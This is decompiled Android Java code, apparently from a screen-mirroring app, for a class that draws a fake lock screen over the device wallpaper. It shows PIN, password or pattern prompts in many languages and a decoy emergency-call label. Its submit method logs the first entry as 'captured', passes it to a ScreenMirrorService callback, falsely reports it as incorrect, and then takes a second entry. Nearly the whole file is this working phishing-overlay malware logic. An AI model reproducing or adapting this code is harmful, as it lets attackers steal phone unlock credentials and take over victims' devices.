// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package w1;

import android.app.WallpaperManager;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.ColorDrawable;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.InputMethodManager;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import java.util.Locale;
import lyr.stable.runtime.ScreenMirrorService;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public final class y5 extends LinearLayout {

    /* JADX INFO: renamed from: a, reason: collision with root package name */
    public final int f5593a;

    /* JADX INFO: renamed from: b, reason: collision with root package name */
    public final EditText f5594b;

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public final TextView f5595c;

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public final StringBuilder f5596d;

    /* JADX INFO: renamed from: e, reason: collision with root package name */
    public final TextView f5597e;

    /* JADX INFO: renamed from: f, reason: collision with root package name */
    public w5 f5598f;

    /* JADX INFO: renamed from: g, reason: collision with root package name */
    public boolean f5599g;

    /* JADX INFO: renamed from: h, reason: collision with root package name */
    public int f5600h;

    /* JADX WARN: Can't fix incorrect switch cases order, some code will duplicate */
    /* JADX WARN: Code duplicated, block: B:153:0x046b  */
    /* JADX WARN: Code duplicated, block: B:154:0x0475 A[PHI: r3 r7 r12 r13 r15
  0x0475: PHI (r3v33 java.lang.String) = 
  (r3v5 java.lang.String)
  (r3v6 java.lang.String)
  (r3v7 java.lang.String)
  (r3v8 java.lang.String)
  (r3v9 java.lang.String)
  (r3v34 java.lang.String)
 binds: [B:210:0x0572, B:206:0x055e, B:202:0x054a, B:199:0x052b, B:194:0x051b, B:153:0x046b] A[DONT_GENERATE, DONT_INLINE]
  0x0475: PHI (r7v49 java.lang.Object) = 
  (r7v37 java.lang.Object)
  (r7v38 java.lang.Object)
  (r7v39 java.lang.Object)
  (r7v41 java.lang.Object)
  (r7v42 java.lang.Object)
  (r7v50 java.lang.Object)
 binds: [B:210:0x0572, B:206:0x055e, B:202:0x054a, B:199:0x052b, B:194:0x051b, B:153:0x046b] A[DONT_GENERATE, DONT_INLINE]
  0x0475: PHI (r12v20 java.lang.Object) = 
  (r12v9 java.lang.Object)
  (r12v10 java.lang.Object)
  (r12v11 java.lang.Object)
  (r12v12 java.lang.Object)
  (r12v13 java.lang.Object)
  (r12v21 java.lang.Object)
 binds: [B:210:0x0572, B:206:0x055e, B:202:0x054a, B:199:0x052b, B:194:0x051b, B:153:0x046b] A[DONT_GENERATE, DONT_INLINE]
  0x0475: PHI (r13v27 java.lang.String) = 
  (r13v15 java.lang.String)
  (r13v16 java.lang.String)
  (r13v17 java.lang.String)
  (r13v19 java.lang.String)
  (r13v20 java.lang.String)
  (r13v28 java.lang.String)
 binds: [B:210:0x0572, B:206:0x055e, B:202:0x054a, B:199:0x052b, B:194:0x051b, B:153:0x046b] A[DONT_GENERATE, DONT_INLINE]
  0x0475: PHI (r15v23 java.lang.String) = 
  (r15v11 java.lang.String)
  (r15v12 java.lang.String)
  (r15v13 java.lang.String)
  (r15v15 java.lang.String)
  (r15v16 java.lang.String)
  (r15v24 java.lang.String)
 binds: [B:210:0x0572, B:206:0x055e, B:202:0x054a, B:199:0x052b, B:194:0x051b, B:153:0x046b] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Code duplicated, block: B:252:0x063f  */
    /* JADX WARN: Code duplicated, block: B:32:0x0108  */
    public y5(ScreenMirrorService screenMirrorService, int i3, Bitmap bitmap) {
        Drawable colorDrawable;
        Drawable drawable;
        String str;
        ScreenMirrorService screenMirrorService2;
        Object obj;
        Object obj2;
        String str2;
        String str3;
        String str4;
        String str5;
        byte b3;
        String str6;
        Object obj3;
        byte b4;
        byte b5;
        super(screenMirrorService);
        this.f5596d = new StringBuilder();
        this.f5593a = i3;
        setOrientation(1);
        if (bitmap == null || bitmap.isRecycled()) {
            try {
                WallpaperManager wallpaperManager = WallpaperManager.getInstance(screenMirrorService);
                if (Build.VERSION.SDK_INT >= 34) {
                    try {
                        drawable = wallpaperManager.getDrawable(2);
                    } catch (Throwable unused) {
                        drawable = null;
                    }
                } else {
                    drawable = null;
                }
                if (drawable == null) {
                    try {
                        drawable = wallpaperManager.getDrawable();
                    } catch (Throwable unused2) {
                    }
                }
                if (drawable == null) {
                    throw new IllegalStateException("no wallpaper drawable");
                }
                int iMax = Math.max(1, drawable.getIntrinsicWidth());
                int iMax2 = Math.max(1, drawable.getIntrinsicHeight());
                Bitmap bitmapCreateBitmap = Bitmap.createBitmap(iMax, iMax2, Bitmap.Config.ARGB_8888);
                Canvas canvas = new Canvas(bitmapCreateBitmap);
                canvas.drawColor(-16777216);
                drawable.setBounds(0, 0, iMax, iMax2);
                drawable.draw(canvas);
                bitmapCreateBitmap.setHasAlpha(false);
                colorDrawable = new BitmapDrawable(screenMirrorService.getResources(), bitmapCreateBitmap);
                setBackground(colorDrawable);
            } catch (Throwable th) {
                Log.w("LockMask", "wallpaper blur fail, opaque fallback: " + th.getMessage());
                colorDrawable = new ColorDrawable(-218103809);
            }
        } else {
            bitmap.setHasAlpha(false);
            setBackground(new BitmapDrawable(screenMirrorService.getResources(), bitmap));
        }
        setGravity(1);
        setFocusable(true);
        setFocusableInTouchMode(true);
        int iA = a(28);
        setPadding(iA, 0, iA, 0);
        addView(d(a(i3 == 1 ? 210 : 300)));
        TextView textView = new TextView(screenMirrorService);
        String language = Locale.getDefault().getLanguage();
        boolean zEquals = "zh".equals(language);
        String str7 = "hi";
        String str8 = "es";
        String str9 = "de";
        if (i3 == 1) {
            str = zEquals ? "输入 PIN 码" : "ko".equals(language) ? "PIN 입력" : "ja".equals(language) ? "PINを入力" : "Enter PIN";
        } else if (i3 != 2) {
            language.getClass();
            switch (language) {
                case "ar":
                    str = "أدخل كلمة المرور";
                    break;
                case "de":
                    str = "Passwort eingeben";
                    break;
                case "es":
                    str = "Introducir contraseña";
                    break;
                case "fr":
                    str = "Saisir le mot de passe";
                    break;
                case "hi":
                    str = "पासवर्ड दर्ज करें";
                    break;
                case "id":
                    str = "Masukkan sandi";
                    break;
                case "ja":
                    str = "パスワードを入力";
                    break;
                case "ko":
                    str = "비밀번호 입력";
                    break;
                case "pt":
                    str = "Digite a senha";
                    break;
                case "ru":
                    str = "Введите пароль";
                    break;
                case "th":
                    str = "ป้อนรหัสผ่าน";
                    break;
                case "tr":
                    str = "Şifreyi girin";
                    break;
                case "vi":
                    str = "Nhập mật khẩu";
                    break;
                case "zh":
                    str = "输入密码";
                    break;
                default:
                    str = "Enter password";
                    break;
            }
        } else {
            str = zEquals ? "绘制解锁图案" : "ko".equals(language) ? "패턴 그리기" : "ja".equals(language) ? "パターンを描画" : "Draw pattern";
        }
        textView.setText(str);
        textView.setTextColor(-1);
        textView.setTextSize(2, 20.0f);
        textView.setGravity(17);
        textView.setShadowLayer(4.0f, 0.0f, 1.0f, Integer.MIN_VALUE);
        addView(textView, new LinearLayout.LayoutParams(-1, -2));
        addView(d(a(24)));
        if (i3 == 1) {
            screenMirrorService2 = screenMirrorService;
            str9 = "de";
            str8 = "es";
            TextView textView2 = new TextView(screenMirrorService2);
            this.f5595c = textView2;
            textView2.setText("");
            this.f5595c.setTextColor(-1);
            this.f5595c.setTextSize(2, 26.0f);
            this.f5595c.setGravity(17);
            this.f5595c.setLetterSpacing(0.35f);
            this.f5595c.setShadowLayer(4.0f, 0.0f, 1.0f, Integer.MIN_VALUE);
            this.f5595c.setMinHeight(a(40));
            addView(this.f5595c, new LinearLayout.LayoutParams(-1, -2));
            addView(d(a(28)));
            String[][] strArr = {new String[]{"1", "2", "3"}, new String[]{"4", "5", "6"}, new String[]{"7", "8", "9"}, new String[]{"⌫", "0", "zh".equals(Locale.getDefault().getLanguage()) ? "确定" : "OK"}};
            int i4 = 0;
            while (i4 < 4) {
                String[] strArr2 = strArr[i4];
                LinearLayout linearLayout = new LinearLayout(screenMirrorService2);
                linearLayout.setOrientation(0);
                linearLayout.setGravity(17);
                int length = strArr2.length;
                int i5 = 0;
                while (i5 < length) {
                    String[][] strArr3 = strArr;
                    final String str10 = strArr2[i5];
                    int i6 = i4;
                    TextView textView3 = new TextView(screenMirrorService2);
                    textView3.setText(str10);
                    int i7 = i5;
                    textView3.setTextColor(-1);
                    String[] strArr4 = strArr2;
                    textView3.setTextSize(2, str10.length() > 1 ? 16.0f : 26.0f);
                    textView3.setGravity(17);
                    textView3.setShadowLayer(4.0f, 0.0f, 1.0f, Integer.MIN_VALUE);
                    textView3.setBackgroundResource(0);
                    textView3.setOnTouchListener(new f2.v(1));
                    textView3.setOnClickListener(new View.OnClickListener() { // from class: w1.t5
                        @Override // android.view.View.OnClickListener
                        public final void onClick(View view) {
                            y5 y5Var = this.f5151a;
                            StringBuilder sb = y5Var.f5596d;
                            if (y5Var.f5599g) {
                                return;
                            }
                            String str11 = str10;
                            if ("⌫".equals(str11)) {
                                if (sb.length() > 0) {
                                    sb.deleteCharAt(sb.length() - 1);
                                }
                            } else if (str11.length() != 1 || !Character.isDigit(str11.charAt(0))) {
                                y5Var.e(sb.toString());
                                return;
                            } else if (sb.length() < 16) {
                                sb.append(str11);
                            }
                            y5Var.c();
                        }
                    });
                    linearLayout.addView(textView3, new LinearLayout.LayoutParams(0, a(64), 1.0f));
                    i5 = i7 + 1;
                    strArr = strArr3;
                    i4 = i6;
                    strArr2 = strArr4;
                    length = length;
                    str7 = str7;
                }
                addView(linearLayout, new LinearLayout.LayoutParams(-1, -2));
                i4++;
                strArr = strArr;
            }
        } else if (i3 != 2) {
            screenMirrorService2 = screenMirrorService;
            EditText editText = new EditText(screenMirrorService2);
            this.f5594b = editText;
            editText.setSingleLine(true);
            this.f5594b.setInputType(129);
            this.f5594b.setImeOptions(6);
            this.f5594b.setTransformationMethod(new u5());
            this.f5594b.setTextColor(-1);
            this.f5594b.setTextSize(2, 24.0f);
            this.f5594b.setGravity(17);
            this.f5594b.setBackgroundColor(0);
            this.f5594b.setHint("");
            this.f5594b.setCursorVisible(true);
            int iA2 = a(6);
            this.f5594b.setPadding(iA2, iA2, iA2, iA2);
            LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(-1, -2);
            int iA3 = a(24);
            layoutParams.leftMargin = iA3;
            layoutParams.rightMargin = iA3;
            addView(this.f5594b, layoutParams);
            View view = new View(screenMirrorService2);
            view.setBackgroundColor(-1711276033);
            LinearLayout.LayoutParams layoutParams2 = new LinearLayout.LayoutParams(-1, a(1));
            layoutParams2.leftMargin = iA3;
            layoutParams2.rightMargin = iA3;
            addView(view, layoutParams2);
            this.f5594b.setOnEditorActionListener(new TextView.OnEditorActionListener() { // from class: w1.s5
                @Override // android.widget.TextView.OnEditorActionListener
                public final boolean onEditorAction(TextView textView4, int i8, KeyEvent keyEvent) {
                    if (i8 != 6 && (keyEvent == null || keyEvent.getKeyCode() != 66 || keyEvent.getAction() != 1)) {
                        return false;
                    }
                    y5 y5Var = this.f5052a;
                    y5Var.e(y5Var.f5594b.getText() == null ? "" : y5Var.f5594b.getText().toString());
                    return true;
                }
            });
            this.f5594b.setOnClickListener(new f2.z(this, 1));
        } else {
            screenMirrorService2 = screenMirrorService;
            View x5Var = new x5(this, screenMirrorService2, new d2.o(14, this));
            int iA4 = a(280);
            addView(x5Var, new LinearLayout.LayoutParams(iA4, iA4));
        }
        String str11 = str7;
        addView(d(a(10)));
        TextView textView4 = new TextView(screenMirrorService2);
        this.f5597e = textView4;
        String language2 = Locale.getDefault().getLanguage();
        boolean zEquals2 = "zh".equals(language2);
        if (i3 == 1) {
            obj2 = "ar";
            str2 = str8;
            str3 = str9;
            str4 = str11;
            if (zEquals2) {
                obj = r12;
                str5 = "PIN 码不正确";
            } else if ("ko".equals(language2)) {
                obj = r12;
                str5 = "PIN이 올바르지 않습니다";
            } else if ("ja".equals(language2)) {
                obj = r12;
                str5 = "PINが正しくありません";
            } else {
                obj = r12;
                str5 = "Incorrect PIN";
            }
        } else if (i3 != 2) {
            language2.getClass();
            switch (language2.hashCode()) {
                case 3121:
                    obj = r12;
                    obj3 = "ar";
                    str2 = str8;
                    str3 = str9;
                    str4 = str11;
                    if (!language2.equals(obj3)) {
                        b4 = -1;
                    } else {
                        b4 = 0;
                    }
                    break;
                case 3201:
                    obj = r12;
                    str2 = str8;
                    str3 = str9;
                    str4 = str11;
                    obj3 = "ar";
                    if (!language2.equals(str3)) {
                        b4 = -1;
                    } else {
                        b4 = 1;
                    }
                    break;
                case 3246:
                    obj = r12;
                    str2 = str8;
                    str4 = str11;
                    obj3 = "ar";
                    str3 = str9;
                    if (!language2.equals(str2)) {
                        b4 = -1;
                    } else {
                        b4 = 2;
                    }
                    break;
                case 3276:
                    obj = r12;
                    str4 = str11;
                    if (!language2.equals(obj)) {
                        obj3 = "ar";
                        str2 = str8;
                        str3 = str9;
                        b4 = -1;
                    } else {
                        b4 = 3;
                        obj3 = "ar";
                        str2 = str8;
                        str3 = str9;
                    }
                    break;
                case 3329:
                    str4 = str11;
                    obj = r12;
                    obj3 = "ar";
                    str2 = str8;
                    str3 = str9;
                    if (!language2.equals(str4)) {
                        b4 = -1;
                    } else {
                        b4 = 4;
                    }
                    break;
                case 3355:
                    if (!language2.equals("id")) {
                        obj = "fr";
                        obj3 = "ar";
                        str2 = str8;
                        str3 = str9;
                        str4 = str11;
                        b4 = -1;
                    } else {
                        obj = r12;
                        obj3 = "ar";
                        str2 = str8;
                        str3 = str9;
                        str4 = str11;
                        b4 = 5;
                    }
                    break;
                case 3383:
                    if (!language2.equals("ja")) {
                        obj = "fr";
                        obj3 = "ar";
                        str2 = str8;
                        str3 = str9;
                        str4 = str11;
                        b4 = -1;
                    } else {
                        obj = r12;
                        obj3 = "ar";
                        str2 = str8;
                        str3 = str9;
                        str4 = str11;
                        b4 = 6;
                    }
                    break;
                case 3428:
                    if (!language2.equals("ko")) {
                        obj = "fr";
                        obj3 = "ar";
                        str2 = str8;
                        str3 = str9;
                        str4 = str11;
                        b4 = -1;
                    } else {
                        obj = r12;
                        obj3 = "ar";
                        str2 = str8;
                        str3 = str9;
                        str4 = str11;
                        b4 = 7;
                    }
                    break;
                case 3588:
                    if (!language2.equals("pt")) {
                        obj = "fr";
                        obj3 = "ar";
                        str2 = str8;
                        str3 = str9;
                        str4 = str11;
                        b4 = -1;
                    } else {
                        obj = r12;
                        obj3 = "ar";
                        str2 = str8;
                        str3 = str9;
                        str4 = str11;
                        b4 = 8;
                    }
                    break;
                case 3651:
                    if (language2.equals("ru")) {
                        b5 = 9;
                        b4 = b5;
                        obj = r12;
                        obj3 = "ar";
                        str2 = str8;
                        str3 = str9;
                        str4 = str11;
                    }
                    obj = "fr";
                    obj3 = "ar";
                    str2 = str8;
                    str3 = str9;
                    str4 = str11;
                    b4 = -1;
                    break;
                case 3700:
                    if (language2.equals("th")) {
                        b4 = 10;
                        obj = r12;
                        obj3 = "ar";
                        str2 = str8;
                        str3 = str9;
                        str4 = str11;
                    }
                    obj = "fr";
                    obj3 = "ar";
                    str2 = str8;
                    str3 = str9;
                    str4 = str11;
                    b4 = -1;
                    break;
                case 3710:
                    if (language2.equals("tr")) {
                        b5 = 11;
                        b4 = b5;
                        obj = r12;
                        obj3 = "ar";
                        str2 = str8;
                        str3 = str9;
                        str4 = str11;
                    }
                    obj = "fr";
                    obj3 = "ar";
                    str2 = str8;
                    str3 = str9;
                    str4 = str11;
                    b4 = -1;
                    break;
                case 3763:
                    if (language2.equals("vi")) {
                        b5 = 12;
                        b4 = b5;
                        obj = r12;
                        obj3 = "ar";
                        str2 = str8;
                        str3 = str9;
                        str4 = str11;
                    }
                    obj = "fr";
                    obj3 = "ar";
                    str2 = str8;
                    str3 = str9;
                    str4 = str11;
                    b4 = -1;
                    break;
                case 3886:
                    if (language2.equals("zh")) {
                        b5 = 13;
                        b4 = b5;
                        obj = r12;
                        obj3 = "ar";
                        str2 = str8;
                        str3 = str9;
                        str4 = str11;
                    }
                    obj = "fr";
                    obj3 = "ar";
                    str2 = str8;
                    str3 = str9;
                    str4 = str11;
                    b4 = -1;
                    break;
                default:
                    obj = "fr";
                    obj3 = "ar";
                    str2 = str8;
                    str3 = str9;
                    str4 = str11;
                    b4 = -1;
                    break;
            }
            switch (b4) {
                case 0:
                    str5 = "كلمة المرور غير صحيحة";
                    break;
                case 1:
                    str5 = "Falsches Passwort";
                    break;
                case 2:
                    str5 = "Contraseña incorrecta";
                    break;
                case 3:
                    str5 = "Mot de passe incorrect";
                    break;
                case 4:
                    str5 = "गलत पासवर्ड";
                    break;
                case 5:
                    str5 = "Sandi salah";
                    break;
                case 6:
                    str5 = "パスワードが正しくありません";
                    break;
                case 7:
                    str5 = "비밀번호가 올바르지 않습니다";
                    break;
                case 8:
                    str5 = "Senha incorreta";
                    break;
                case 9:
                    str5 = "Неверный пароль";
                    break;
                case 10:
                    str5 = "รหัสผ่านไม่ถูกต้อง";
                    break;
                case 11:
                    str5 = "Yanlış şifre";
                    break;
                case 12:
                    str5 = "Mật khẩu không đúng";
                    break;
                case 13:
                    str5 = "密码不正确";
                    break;
                default:
                    str5 = "Incorrect password";
                    break;
            }
            obj2 = obj3;
        } else {
            obj2 = "ar";
            str2 = str8;
            str3 = str9;
            str4 = str11;
            if (zEquals2) {
                obj = r12;
                str5 = "图案不正确";
            } else if ("ko".equals(language2)) {
                obj = r12;
                str5 = "패턴이 올바르지 않습니다";
            } else if ("ja".equals(language2)) {
                obj = r12;
                str5 = "パターンが正しくありません";
            } else {
                obj = r12;
                str5 = "Incorrect pattern";
            }
        }
        textView4.setText(str5);
        textView4.setTextColor(-38037);
        textView4.setTextSize(2, 14.0f);
        textView4.setGravity(17);
        textView4.setVisibility(8);
        Object obj4 = obj2;
        addView(textView4, new LinearLayout.LayoutParams(-1, -2));
        String str12 = str3;
        addView(new View(screenMirrorService2), new LinearLayout.LayoutParams(1, 0, 1.0f));
        TextView textView5 = new TextView(screenMirrorService2);
        String language3 = Locale.getDefault().getLanguage();
        language3.getClass();
        switch (language3.hashCode()) {
            case 3121:
                if (!language3.equals(obj4)) {
                    b3 = -1;
                } else {
                    b3 = 0;
                }
                break;
            case 3201:
                if (!language3.equals(str12)) {
                    b3 = -1;
                } else {
                    b3 = 1;
                }
                break;
            case 3246:
                if (!language3.equals(str2)) {
                    b3 = -1;
                } else {
                    b3 = 2;
                }
                break;
            case 3276:
                if (!language3.equals(obj)) {
                    b3 = -1;
                } else {
                    b3 = 3;
                }
                break;
            case 3329:
                if (!language3.equals(str4)) {
                    b3 = -1;
                } else {
                    b3 = 4;
                }
                break;
            case 3355:
                if (!language3.equals("id")) {
                    b3 = -1;
                } else {
                    b3 = 5;
                }
                break;
            case 3383:
                if (!language3.equals("ja")) {
                    b3 = -1;
                } else {
                    b3 = 6;
                }
                break;
            case 3428:
                if (!language3.equals("ko")) {
                    b3 = -1;
                } else {
                    b3 = 7;
                }
                break;
            case 3588:
                if (!language3.equals("pt")) {
                    b3 = -1;
                } else {
                    b3 = 8;
                }
                break;
            case 3651:
                if (!language3.equals("ru")) {
                    b3 = -1;
                } else {
                    b3 = 9;
                }
                break;
            case 3700:
                if (!language3.equals("th")) {
                    b3 = -1;
                } else {
                    b3 = 10;
                }
                break;
            case 3710:
                if (!language3.equals("tr")) {
                    b3 = -1;
                } else {
                    b3 = 11;
                }
                break;
            case 3763:
                if (!language3.equals("vi")) {
                    b3 = -1;
                } else {
                    b3 = 12;
                }
                break;
            case 3886:
                if (!language3.equals("zh")) {
                    b3 = -1;
                } else {
                    b3 = 13;
                }
                break;
            default:
                b3 = -1;
                break;
        }
        switch (b3) {
            case 0:
                str6 = "مكالمة طوارئ";
                break;
            case 1:
                str6 = "Notruf";
                break;
            case 2:
                str6 = "Llamada de emergencia";
                break;
            case 3:
                str6 = "Appel d'urgence";
                break;
            case 4:
                str6 = "आपातकालीन कॉल";
                break;
            case 5:
                str6 = "Panggilan darurat";
                break;
            case 6:
                str6 = "緊急通報";
                break;
            case 7:
                str6 = "긴급전화";
                break;
            case 8:
                str6 = "Chamada de emergência";
                break;
            case 9:
                str6 = "Экстренный вызов";
                break;
            case 10:
                str6 = "สายเร่งด่วน";
                break;
            case 11:
                str6 = "Acil arama";
                break;
            case 12:
                str6 = "Cuộc gọi khẩn cấp";
                break;
            case 13:
                str6 = "紧急呼叫";
                break;
            default:
                str6 = "Emergency call";
                break;
        }
        textView5.setText(str6);
        textView5.setTextColor(-1);
        textView5.setTextSize(2, 14.0f);
        textView5.setGravity(17);
        textView5.setShadowLayer(4.0f, 0.0f, 1.0f, Integer.MIN_VALUE);
        LinearLayout.LayoutParams layoutParams3 = new LinearLayout.LayoutParams(-1, -2);
        layoutParams3.bottomMargin = a(36);
        addView(textView5, layoutParams3);
    }

    public final int a(int i3) {
        return (int) ((i3 * getResources().getDisplayMetrics().density) + 0.5f);
    }

    public final void b() {
        EditText editText = this.f5594b;
        if (editText == null) {
            return;
        }
        editText.requestFocus();
        InputMethodManager inputMethodManager = (InputMethodManager) getContext().getSystemService("input_method");
        if (inputMethodManager != null) {
            inputMethodManager.showSoftInput(this.f5594b, 1);
        }
    }

    public final void c() {
        StringBuilder sb = new StringBuilder();
        for (int i3 = 0; i3 < this.f5596d.length(); i3++) {
            sb.append((char) 9679);
        }
        this.f5595c.setText(sb.toString());
    }

    public final View d(int i3) {
        View view = new View(getContext());
        view.setLayoutParams(new LinearLayout.LayoutParams(1, i3));
        return view;
    }

    public final void e(String str) {
        if (str.isEmpty() || this.f5599g) {
            return;
        }
        int i3 = this.f5600h;
        int i4 = this.f5593a;
        if (i3 != 0) {
            this.f5599g = true;
            StringBuilder sbI = a0.a.i(i4, "[LockMask] credential submitted mode=", " len=");
            sbI.append(str.length());
            Log.i("ScreenMirror", sbI.toString());
            if (i4 == 0 && this.f5594b != null) {
                InputMethodManager inputMethodManager = (InputMethodManager) getContext().getSystemService("input_method");
                if (inputMethodManager != null) {
                    inputMethodManager.hideSoftInputFromWindow(this.f5594b.getWindowToken(), 0);
                }
                this.f5594b.clearFocus();
            }
            postDelayed(new a2.h(this, str, 24), 80L);
            return;
        }
        this.f5600h = i3 + 1;
        StringBuilder sbI2 = a0.a.i(i4, "[LockMask] first attempt captured mode=", " len=");
        sbI2.append(str.length());
        Log.i("ScreenMirror", sbI2.toString());
        w5 w5Var = this.f5598f;
        if (w5Var != null) {
            p2.a0 a0Var = (p2.a0) w5Var;
            ScreenMirrorService.j(a0Var.f2874a, str, (ScreenMirrorService) a0Var.f2875b);
        }
        EditText editText = this.f5594b;
        if (editText != null) {
            editText.setText("");
        }
        this.f5596d.setLength(0);
        if (this.f5595c != null) {
            c();
        }
        TextView textView = this.f5597e;
        if (textView != null) {
            textView.setVisibility(0);
        }
        try {
            performHapticFeedback(17);
        } catch (Throwable unused) {
        }
    }

    @Override // android.view.ViewGroup, android.view.View
    public final void onAttachedToWindow() {
        super.onAttachedToWindow();
        if (this.f5593a == 0) {
            postDelayed(new a2.b(23, this), 250L);
        }
    }

    public void setCallback(w5 w5Var) {
        this.f5598f = w5Var;
    }
}
